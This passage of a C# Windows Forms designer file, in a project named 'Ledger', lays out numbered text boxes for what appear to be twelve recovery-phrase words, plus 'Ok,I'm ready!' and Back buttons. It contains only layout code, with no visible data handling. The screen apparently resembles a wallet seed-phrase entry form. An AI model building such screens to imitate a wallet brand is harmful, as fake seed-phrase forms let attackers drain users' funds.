            this.mnem10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem10.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem10.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem10.ForeColor = System.Drawing.Color.White;
            this.mnem10.Location = new System.Drawing.Point(585, 746);
            this.mnem10.Margin = new System.Windows.Forms.Padding(5);
            this.mnem10.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem10.Multiline = true;
            this.mnem10.Name = "mnem10";
            this.mnem10.Size = new System.Drawing.Size(222, 39);
            this.mnem10.TabIndex = 42;
            this.mnem10.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem9
            // 
            this.mnem9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem9.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem9.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem9.ForeColor = System.Drawing.Color.White;
            this.mnem9.Location = new System.Drawing.Point(585, 686);
            this.mnem9.Margin = new System.Windows.Forms.Padding(5);
            this.mnem9.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem9.Multiline = true;
            this.mnem9.Name = "mnem9";
            this.mnem9.Size = new System.Drawing.Size(222, 39);
            this.mnem9.TabIndex = 41;
            this.mnem9.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem8
            // 
            this.mnem8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem8.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem8.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem8.ForeColor = System.Drawing.Color.White;
            this.mnem8.Location = new System.Drawing.Point(585, 625);
            this.mnem8.Margin = new System.Windows.Forms.Padding(5);
            this.mnem8.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem8.Multiline = true;
            this.mnem8.Name = "mnem8";
            this.mnem8.Size = new System.Drawing.Size(222, 39);
            this.mnem8.TabIndex = 40;
            this.mnem8.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem7
            // 
            this.mnem7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem7.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem7.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem7.ForeColor = System.Drawing.Color.White;
            this.mnem7.Location = new System.Drawing.Point(585, 565);
            this.mnem7.Margin = new System.Windows.Forms.Padding(5);
            this.mnem7.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem7.Multiline = true;
            this.mnem7.Name = "mnem7";
            this.mnem7.Size = new System.Drawing.Size(222, 39);
            this.mnem7.TabIndex = 39;
            this.mnem7.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem6
            // 
            this.mnem6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem6.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem6.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem6.ForeColor = System.Drawing.Color.White;
            this.mnem6.Location = new System.Drawing.Point(585, 505);
            this.mnem6.Margin = new System.Windows.Forms.Padding(5);
            this.mnem6.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem6.Multiline = true;
            this.mnem6.Name = "mnem6";
            this.mnem6.Size = new System.Drawing.Size(222, 39);
            this.mnem6.TabIndex = 38;
            this.mnem6.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem5
            // 
            this.mnem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem5.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem5.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem5.ForeColor = System.Drawing.Color.White;
            this.mnem5.Location = new System.Drawing.Point(585, 444);
            this.mnem5.Margin = new System.Windows.Forms.Padding(5);
            this.mnem5.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem5.Multiline = true;
            this.mnem5.Name = "mnem5";
            this.mnem5.Size = new System.Drawing.Size(222, 39);
            this.mnem5.TabIndex = 37;
            this.mnem5.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem4
            // 
            this.mnem4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem4.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem4.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem4.ForeColor = System.Drawing.Color.White;
            this.mnem4.Location = new System.Drawing.Point(585, 384);
            this.mnem4.Margin = new System.Windows.Forms.Padding(5);
            this.mnem4.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem4.Multiline = true;
            this.mnem4.Name = "mnem4";
            this.mnem4.Size = new System.Drawing.Size(222, 39);
            this.mnem4.TabIndex = 36;
            this.mnem4.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem3
            // 
            this.mnem3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem3.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem3.ForeColor = System.Drawing.Color.White;
            this.mnem3.Location = new System.Drawing.Point(585, 324);
            this.mnem3.Margin = new System.Windows.Forms.Padding(5);
            this.mnem3.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem3.Multiline = true;
            this.mnem3.Name = "mnem3";
            this.mnem3.Size = new System.Drawing.Size(222, 39);
            this.mnem3.TabIndex = 35;
            this.mnem3.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem2
            // 
            this.mnem2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem2.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem2.ForeColor = System.Drawing.Color.White;
            this.mnem2.Location = new System.Drawing.Point(585, 263);
            this.mnem2.Margin = new System.Windows.Forms.Padding(5);
            this.mnem2.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem2.Multiline = true;
            this.mnem2.Name = "mnem2";
            this.mnem2.Size = new System.Drawing.Size(222, 39);
            this.mnem2.TabIndex = 34;
            this.mnem2.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.BackColor = System.Drawing.Color.Transparent;
            this.label15.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label15.ForeColor = System.Drawing.Color.DarkGray;
            this.label15.Location = new System.Drawing.Point(535, 886);
            this.label15.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(34, 20);
            this.label15.TabIndex = 33;
            this.label15.Text = "12.";
            this.label15.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.BackColor = System.Drawing.Color.Transparent;
            this.label14.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label14.ForeColor = System.Drawing.Color.DarkGray;
            this.label14.Location = new System.Drawing.Point(535, 826);
            this.label14.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(34, 20);
            this.label14.TabIndex = 32;
            this.label14.Text = "11.";
            this.label14.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.BackColor = System.Drawing.Color.Transparent;
            this.label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label13.ForeColor = System.Drawing.Color.DarkGray;
            this.label13.Location = new System.Drawing.Point(535, 766);
            this.label13.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(34, 20);
            this.label13.TabIndex = 31;
            this.label13.Text = "10.";
            this.label13.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.BackColor = System.Drawing.Color.Transparent;
            this.label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label12.ForeColor = System.Drawing.Color.DarkGray;
            this.label12.Location = new System.Drawing.Point(535, 705);
            this.label12.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(24, 20);
            this.label12.TabIndex = 30;
            this.label12.Text = "9.";
            this.label12.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.BackColor = System.Drawing.Color.Transparent;
            this.label11.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.ForeColor = System.Drawing.Color.DarkGray;
            this.label11.Location = new System.Drawing.Point(535, 645);
            this.label11.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(24, 20);
            this.label11.TabIndex = 29;
            this.label11.Text = "8.";
            this.label11.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.Transparent;
            this.label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.Color.DarkGray;
            this.label10.Location = new System.Drawing.Point(535, 585);
            this.label10.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(24, 20);
            this.label10.TabIndex = 28;
            this.label10.Text = "7.";
            this.label10.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.BackColor = System.Drawing.Color.Transparent;
            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.Color.DarkGray;
            this.label9.Location = new System.Drawing.Point(535, 524);
            this.label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(24, 20);
            this.label9.TabIndex = 27;
            this.label9.Text = "6.";
            this.label9.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.Transparent;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.DarkGray;
            this.label8.Location = new System.Drawing.Point(535, 464);
            this.label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(24, 20);
            this.label8.TabIndex = 26;
            this.label8.Text = "5.";
            this.label8.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.Color.DarkGray;
            this.label7.Location = new System.Drawing.Point(535, 404);
            this.label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(24, 20);
            this.label7.TabIndex = 25;
            this.label7.Text = "4.";
            this.label7.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.Transparent;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.DarkGray;
            this.label6.Location = new System.Drawing.Point(535, 343);
            this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(24, 20);
            this.label6.TabIndex = 24;
            this.label6.Text = "3.";
            this.label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.DarkGray;
            this.label5.Location = new System.Drawing.Point(535, 283);
            this.label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(24, 20);
            this.label5.TabIndex = 23;
            this.label5.Text = "2.";
            this.label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.DarkGray;
            this.label1.Location = new System.Drawing.Point(535, 223);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(24, 20);
            this.label1.TabIndex = 22;
            this.label1.Text = "1.";
            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // mnem1
            // 
            this.mnem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem1.ForeColor = System.Drawing.Color.White;
            this.mnem1.Location = new System.Drawing.Point(585, 203);
            this.mnem1.Margin = new System.Windows.Forms.Padding(5);
            this.mnem1.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem1.Multiline = true;
            this.mnem1.Name = "mnem1";
            this.mnem1.Size = new System.Drawing.Size(222, 39);
            this.mnem1.TabIndex = 10;
            this.mnem1.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // Readybtn
            // 
            this.Readybtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.Readybtn.BackColor = System.Drawing.Color.Transparent;
            this.Readybtn.CheckButton = false;
            this.Readybtn.Checked = false;
            this.Readybtn.CheckedBackground = System.Drawing.Color.DarkGray;
            this.Readybtn.CheckedForeColor = System.Drawing.Color.White;
            this.Readybtn.CheckedImageTint = System.Drawing.Color.White;
            this.Readybtn.CheckedOutline = System.Drawing.Color.DarkGray;
            this.Readybtn.Content = "Ok,I\'m ready!";
            this.Readybtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Readybtn.DialogResult = System.Windows.Forms.DialogResult.None;
            this.Readybtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Readybtn.ForeColor = System.Drawing.Color.Black;
            this.Readybtn.HoverBackground = System.Drawing.Color.DarkGray;
            this.Readybtn.HoveredImageTint = System.Drawing.Color.White;
            this.Readybtn.HoverForeColor = System.Drawing.Color.White;
            this.Readybtn.HoverOutline = System.Drawing.Color.DarkGray;
            this.Readybtn.Image = null;
            this.Readybtn.ImageAutoCenter = true;
            this.Readybtn.ImageExpand = new System.Drawing.Point(30, 3);
            this.Readybtn.ImageOffset = new System.Drawing.Point(20, 30);
            this.Readybtn.Location = new System.Drawing.Point(493, 784);
            this.Readybtn.Margin = new System.Windows.Forms.Padding(4);
            this.Readybtn.Name = "Readybtn";
            this.Readybtn.NormalBackground = System.Drawing.Color.WhiteSmoke;
            this.Readybtn.NormalForeColor = System.Drawing.Color.Black;
            this.Readybtn.NormalImageTint = System.Drawing.Color.White;
            this.Readybtn.NormalOutline = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.Readybtn.OutlineThickness = 1.6F;
            this.Readybtn.PressedBackground = System.Drawing.Color.Transparent;
            this.Readybtn.PressedForeColor = System.Drawing.Color.White;
            this.Readybtn.PressedImageTint = System.Drawing.Color.White;
            this.Readybtn.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.Readybtn.Rounding = new System.Windows.Forms.Padding(18);
            this.Readybtn.Size = new System.Drawing.Size(213, 46);
            this.Readybtn.TabIndex = 9;
            this.Readybtn.TextAlignment = System.Drawing.StringAlignment.Center;
            this.Readybtn.TextOffset = new System.Drawing.Point(0, 0);
            this.Readybtn.Click += new System.EventHandler(this.Readybtn_Click);
            // 
            // Backbt
            // 
            this.Backbt.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.Backbt.BackColor = System.Drawing.Color.Transparent;
            this.Backbt.CheckButton = false;
            this.Backbt.Checked = false;
            this.Backbt.CheckedBackground = System.Drawing.Color.Transparent;
            this.Backbt.CheckedForeColor = System.Drawing.Color.White;
            this.Backbt.CheckedImageTint = System.Drawing.Color.White;
            this.Backbt.CheckedOutline = System.Drawing.Color.DarkGray;
            this.Backbt.Content = "  Back";
            this.Backbt.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Backbt.DialogResult = System.Windows.Forms.DialogResult.None;
            this.Backbt.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Backbt.ForeColor = System.Drawing.Color.White;
            this.Backbt.HoverBackground = System.Drawing.Color.Transparent;
            this.Backbt.HoveredImageTint = System.Drawing.Color.White;
            this.Backbt.HoverForeColor = System.Drawing.Color.White;
            this.Backbt.HoverOutline = System.Drawing.Color.DarkGray;
            this.Backbt.Image = global::Ledger.MainClassFolder.Properties.Resources.Left_Arrow;
            this.Backbt.ImageAutoCenter = true;
            this.Backbt.ImageExpand = new System.Drawing.Point(3, 3);
            this.Backbt.ImageOffset = new System.Drawing.Point(0, 0);
            this.Backbt.Location = new System.Drawing.Point(585, 784);
            this.Backbt.Margin = new System.Windows.Forms.Padding(4);
            this.Backbt.Name = "Backbt";
            this.Backbt.NormalBackground = System.Drawing.Color.Transparent;
            this.Backbt.NormalForeColor = System.Drawing.Color.White;
            this.Backbt.NormalImageTint = System.Drawing.Color.White;
            this.Backbt.NormalOutline = System.Drawing.Color.DarkGray;
            this.Backbt.OutlineThickness = 1.6F;
            this.Backbt.PressedBackground = System.Drawing.Color.Transparent;
            this.Backbt.PressedForeColor = System.Drawing.Color.White;
            this.Backbt.PressedImageTint = System.Drawing.Color.White;
            this.Backbt.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.Backbt.Rounding = new System.Windows.Forms.Padding(18);
            this.Backbt.Size = new System.Drawing.Size(141, 46);
            this.Backbt.TabIndex = 8;
            this.Backbt.TextAlignment = System.Drawing.StringAlignment.Center;
            this.Backbt.TextOffset = new System.Drawing.Point(0, 0);
            this.Backbt.Click += new System.EventHandler(this.Backbt_Click);
            // 
            // panel3
            // 
            this.panel3.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.Screenshot_2025_04_26_082339;
            this.panel3.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel3.Location = new System.Drawing.Point(0, 0);
            this.panel3.Margin = new System.Windows.Forms.Padding(4);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(429, 875);
            this.panel3.TabIndex = 10;
            // 
            // imageList1
            // 
            this.imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.imageList1.ImageSize = new System.Drawing.Size(16, 16);
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // Page3
            // 
            this.Page3.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.Untitled_1;
            this.Page3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Page3.Controls.Add(this.cuiButton9);
            this.Page3.Controls.Add(this.SetUp);
            this.Page3.Controls.Add(this.FirstTime);
            this.Page3.Controls.Add(this.cuiButton4);
            this.Page3.Controls.Add(this.cuiButton5);
            this.Page3.Controls.Add(this.cuiButton6);
            this.Page3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Page3.Location = new System.Drawing.Point(0, 0);
            this.Page3.Margin = new System.Windows.Forms.Padding(4);
            this.Page3.Name = "Page3";
            this.Page3.Size = new System.Drawing.Size(1604, 875);
            this.Page3.TabIndex = 4;
            this.Page3.Visible = false;
            // 
            // cuiButton9
            // 
            this.cuiButton9.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton9.CheckButton = false;
            this.cuiButton9.Checked = false;
            this.cuiButton9.CheckedBackground = System.Drawing.Color.Transparent;
            this.cuiButton9.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton9.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton9.CheckedOutline = System.Drawing.Color.DarkGray;
            this.cuiButton9.Content = "  Previous";
            this.cuiButton9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton9.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cuiButton9.ForeColor = System.Drawing.Color.White;
            this.cuiButton9.HoverBackground = System.Drawing.Color.Transparent;
            this.cuiButton9.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton9.HoverForeColor = System.Drawing.Color.White;
            this.cuiButton9.HoverOutline = System.Drawing.Color.DarkGray;
            this.cuiButton9.Image = global::Ledger.MainClassFolder.Properties.Resources.Left_Arrow;
            this.cuiButton9.ImageAutoCenter = true;
            this.cuiButton9.ImageExpand = new System.Drawing.Point(3, 3);
            this.cuiButton9.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton9.Location = new System.Drawing.Point(36, 28);
            this.cuiButton9.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton9.Name = "cuiButton9";
            this.cuiButton9.NormalBackground = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton9.NormalForeColor = System.Drawing.Color.White;
            this.cuiButton9.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton9.NormalOutline = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton9.OutlineThickness = 1.6F;
            this.cuiButton9.PressedBackground = System.Drawing.Color.Transparent;
            this.cuiButton9.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton9.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton9.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton9.Rounding = new System.Windows.Forms.Padding(18);
            this.cuiButton9.Size = new System.Drawing.Size(141, 46);
            this.cuiButton9.TabIndex = 7;
            this.cuiButton9.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton9.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton9.Click += new System.EventHandler(this.cuiButton9_Click);
            // 
            // SetUp
            // 
            this.SetUp.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.SetUp.AutoSize = true;
            this.SetUp.BackColor = System.Drawing.Color.Transparent;
            this.SetUp.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SetUp.Location = new System.Drawing.Point(1239, 273);
            this.SetUp.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.SetUp.Name = "SetUp";
            this.SetUp.Size = new System.Drawing.Size(52, 18);
            this.SetUp.TabIndex = 1;
            this.SetUp.Text = "label5";
            // 
            // FirstTime
            // 
            this.FirstTime.AutoSize = true;
            this.FirstTime.BackColor = System.Drawing.Color.Transparent;
            this.FirstTime.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FirstTime.Location = new System.Drawing.Point(123, 124);
            this.FirstTime.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.FirstTime.Name = "FirstTime";
            this.FirstTime.Size = new System.Drawing.Size(85, 29);
            this.FirstTime.TabIndex = 0;
            this.FirstTime.Text = "label1";
            // 
            // cuiButton4
            // 
            this.cuiButton4.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.cuiButton4.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton4.CheckButton = false;
            this.cuiButton4.Checked = false;
            this.cuiButton4.CheckedBackground = System.Drawing.Color.Transparent;
            this.cuiButton4.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton4.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton4.CheckedOutline = System.Drawing.Color.Olive;
            this.cuiButton4.Content = "";
            this.cuiButton4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton4.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.cuiButton4.ForeColor = System.Drawing.Color.Black;
            this.cuiButton4.HoverBackground = System.Drawing.Color.Transparent;
            this.cuiButton4.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton4.HoverForeColor = System.Drawing.Color.Black;
            this.cuiButton4.HoverOutline = System.Drawing.Color.Olive;
            this.cuiButton4.Image = null;
            this.cuiButton4.ImageAutoCenter = true;
            this.cuiButton4.ImageExpand = new System.Drawing.Point(0, 0);
